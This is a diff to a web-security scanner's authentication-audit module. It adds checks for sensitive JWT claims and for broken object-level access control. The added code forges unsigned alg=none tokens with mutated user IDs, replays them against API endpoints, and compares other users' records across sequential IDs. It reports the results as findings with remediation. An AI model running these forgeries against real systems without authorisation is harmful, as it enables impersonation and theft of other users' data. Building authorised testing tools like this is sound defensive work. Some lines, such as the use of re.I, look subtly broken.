@@ -217,6 +217,7 @@ class AuthAudit(BaseModule):
                    "token": token,
                    "token_preview": redact_secret(token)},
         )
+        self._audit_token_claims(endpoint, identity)
         technique = identity["technique"]
         if technique == "sqli_auth_bypass":
             title, severity = "SQL Injection Authentication Bypass", "CRITICAL"
@@ -248,6 +249,51 @@ class AuthAudit(BaseModule):
         )
 
     # ── Authenticated follow-ups ────────────────────────────────
+
+    def _audit_token_claims(self, endpoint: str, identity: dict) -> None:
+        """Sensitive keys inside the captured token's own claims.
+
+        A password hash riding in the JWT payload is exposed to every
+        client, proxy log, and error report that touches the token —
+        the same exposure class as response bodies, from a different
+        mouth.
+        """
+        from core.validators import (
+            RESPONSE_SENSITIVE_KEYS,
+            looks_real_value,
+            walk_json,
+        )
+        claims = identity.get("claims", {}) or {}
+        hits = []
+        for _path, key, value in walk_json(claims):
+            severity = RESPONSE_SENSITIVE_KEYS.get(str(key).lower())
+            if not severity or not isinstance(value, (str, int)):
+                continue
+            if looks_real_value(value):
+                hits.append((severity, key, value))
+        if not hits:
+            return
+        worst = max(severity for severity, _, _ in hits)
+        self.state.add_finding(
+            title="Sensitive Keys Inside JWT Claims",
+            severity=worst,
+            confidence="CONFIRMED",
+            category="Sensitive Data Exposure",
+            description=(
+                f"The session token issued by {endpoint} carries "
+                f"{len(hits)} sensitive field(s) "
+                f"({', '.join(sorted({k for _, k, _ in hits}))}) inside its "
+                f"claims. JWT payloads are base64, not encryption: every "
+                f"client, log, and proxy on the path reads them."),
+            evidence=[f"{key}: {redact_secret(value)}"
+                      for _, key, value in hits[:10]],
+            remediation="Keep only identifiers in claims; fetch the rest "
+                        "server-side per request.",
+            asset_keys=[f"url:{endpoint}"],
+            verified=True,
+                    verification={"method": "sensitive_jwt_claims",
+                                  "url": endpoint},
+            )
 
     async def _authenticated_follow_ups(self, identity: dict) -> None:
         """Spend the captured session where it proves the most: admin
@@ -323,12 +369,20 @@ class AuthAudit(BaseModule):
         session skips signature verification entirely: authentication
         as anyone, minted locally.
         """
+        import base64 as _b64
+        import json as _json
         token = identity.get("token", "")
         if not token or token.startswith("cookie:"):
             return
         forged = _none_alg_variant(token)
         if forged == token:
             return
+        try:
+            claims = _json.loads(_b64.urlsafe_b64decode(
+                token.split(".")[1] + "==").decode())
+        except Exception:
+            claims = {}
+        id_mutations = _id_mutations(claims)
         targets = []
         for asset in self.state.get_assets_by_type("api_endpoint"):
             value = str(asset.get("value", "") or "")
@@ -373,6 +427,122 @@ class AuthAudit(BaseModule):
                 verification={"method": "none_alg_replay_accepted",
                               "url": url},
             )
+            await self._bola_via_forgery(url, token, id_mutations, anon)
+            await self._bola_across_ids(url, forged, anon)
+
+    async def _bola_via_forgery(self, url: str, token: str,
+                                id_mutations: list, anon: dict) -> None:
+        """Mutate the identity claim inside an unsigned forgery.
+
+        The none-alg token above proves signatures are unchecked; this
+        proves authorization is unchecked too. A forged id:2 that returns
+        another user's record where the valid session returns our own is
+        horizontal access control failure minted locally — no victim
+        account needed.
+        """
+        import base64 as _b64
+        import json as _json
+        parts = token.split(".")
+        if len(parts) != 3:
+            return
+        try:
+            original_claims = _json.loads(_b64.urlsafe_b64decode(
+                parts[1] + "==").decode())
+        except Exception:
+            return
+        try:
+            original = await _get(
+                url, {"Authorization": f"Bearer {token}"})
+        except Exception:
+            return
+        original_body = original.get("body", "") or ""
+        if original.get("status") != 200 or not original_body:
+            return
+        for label, mutated_claims in id_mutations:
+            payload = _b64.urlsafe_b64encode(
+                _json.dumps(mutated_claims).encode()).decode().rstrip("=")
+            header = _b64.urlsafe_b64encode(
+                _json.dumps({"alg": "none", "typ": "JWT"}).encode()
+            ).decode().rstrip("=")
+            forged_token = f"{header}.{payload}."
+            mutated = await _get(
+                url, {"Authorization": f"Bearer {forged_token}"})
+            mutated_body = mutated.get("body", "") or ""
+            if mutated.get("status") != 200 or not mutated_body:
+                continue
+            if mutated_body == original_body or mutated_body == (anon.get("body", "") or ""):
+                continue
+            self.state.add_finding(
+                title=f"BOLA via Forged Identity ({label}): {url}",
+                severity="CRITICAL",
+                confidence="CONFIRMED",
+                category="Broken Access Control",
+                description=(
+                    f"{url} served a DIFFERENT user's record to an unsigned "
+                    f"token carrying mutated identity claims ({label}). "
+                    f"Neither the signature nor the ownership is checked: "
+                    f"any account's data is retrievable."),
+                evidence=[f"URL: {url}", f"Mutation: {label}",
+                          f"Own record: {original_body[:150]}",
+                          f"Other record: {mutated_body[:150]}"],
+                remediation="Verify signatures AND authorize the object "
+                            "against the authenticated principal on every "
+                            "request.",
+                asset_keys=[f"url:{url}"],
+                verified=True,
+                verification={"method": "bola_unsigned_claim_mutation",
+                              "url": url},
+            )
+            return
+
+    async def _bola_across_ids(self, url: str, forged: str,
+                               anon: dict) -> None:
+        """Sequential IDs under one forgery: /1 and /2 must not both
+        answer with different users' records.
+
+        Only runs on URLs that end in /1 (concretized {id} templates):
+        the sibling /2 is the same resource class, so two different
+        owners' data under one token is horizontal access failure, not
+        two endpoints behaving differently.
+        """
+        import re as _re
+        match = _re.search(r"/1([/?#]|$)", url)
+        if not match:
+            return
+        sibling = url[:match.start()] + "/2" + match.group(1)
+        first = await _get(url, {"Authorization": f"Bearer {forged}"})
+        second = await _get(sibling, {"Authorization": f"Bearer {forged}"})
+        first_body, second_body = (first.get("body", "") or "",
+                                   second.get("body", "") or "")
+        if first.get("status") != 200 or second.get("status") != 200:
+            return
+        if not first_body or not second_body or first_body == second_body:
+            return
+        first_owners = _owner_markers(first_body)
+        second_owners = _owner_markers(second_body)
+        if not first_owners or not second_owners:
+            return
+        if first_owners & second_owners:
+            return
+        self.state.add_finding(
+            title=f"BOLA Across Sequential IDs: {url} vs {sibling}",
+            severity="HIGH",
+            confidence="CONFIRMED",
+            category="Broken Access Control",
+            description=(
+                f"One forged session reads two different owners' records "
+                f"({sorted(first_owners)[:3]} vs "
+                f"{sorted(second_owners)[:3]}): object authorization is "
+                f"absent on this resource."),
+            evidence=[f"ID 1: {url} -> {sorted(first_owners)[:5]}",
+                      f"ID 2: {sibling} -> {sorted(second_owners)[:5]}"],
+            remediation="Authorize every object read against the "
+                        "authenticated principal.",
+            asset_keys=[f"url:{url}", f"url:{sibling}"],
+            verified=True,
+            verification={"method": "bola_sequential_ids_forged_session",
+                          "url": url},
+        )
 
     async def _write_access_probes(self, identity: dict) -> None:
         """No-op PUTs: write access proven without changing anything.
@@ -619,6 +789,67 @@ def _responses_match(first: dict, second: dict) -> bool:
     return first.get("status") == second.get("status") and \
         first.get("status") == 200 and \
         first.get("body", "") == second.get("body", "")
+
+
+def _id_mutations(claims: dict) -> list:
+    """Unsigned-forgery identity variants: numeric ids ±1, role swaps.
+
+    Looks through wrapper claims ({"data": {...}}) as well as flat
+    ones. Each entry is (label, mutated-claims-dict) ready to re-sign
+    with alg=none.
+    """
+    scopes = []
+    if isinstance(claims, dict):
+        scopes.append(((), claims))
+        nested = claims.get("data")
+        if isinstance(nested, dict):
+            scopes.append((("data",), nested))
+    mutations = []
+    for path, scope in scopes:
+        for key in ("id", "userId", "user_id", "sub", "uid"):
+            value = scope.get(key)
+            number = _as_int(value)
+            if number is None:
+                continue
+            for delta in (1, -1):
+                mutated = _deep_copy(claims)
+                target = mutated
+                for step in path:
+                    target = target[step]
+                target[key] = number + delta
+                where = ".".join([*path, key]) if path else key
+                mutations.append((f"{where} {number}->{number + delta}",
+                                  mutated))
+                if len(mutations) >= 4:
+                    return mutations
+    return mutations
+
+
+def _as_int(value) -> int | None:
+    try:
+        number = int(str(value))
+    except (TypeError, ValueError):
+        return None
+    return number if number > 0 else None
+
+
+def _deep_copy(obj):
+    import copy
+    return copy.deepcopy(obj)
+
+
+def _owner_markers(body: str) -> set:
+    """Identity-bearing strings in a response: emails and id fields."""
+    import re as _re
+    markers = set()
+    for email in _re.findall(
+            r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", body or ""):
+        markers.add(email.lower())
+    for match in _re.finditer(r'"(?:user_?id|email|owner_?id|account_?id)"\s*:\s*"?([^",}]+)"?', body or "", re.I):
+        markers.add(match.group(1).strip().lower())
+    for match in _re.finditer(r'"id"\s*:\s*(\d+)', body or ""):
+        markers.add("id:" + match.group(1))
+    return markers
 
 
 def _none_alg_variant(token: str) -> str:
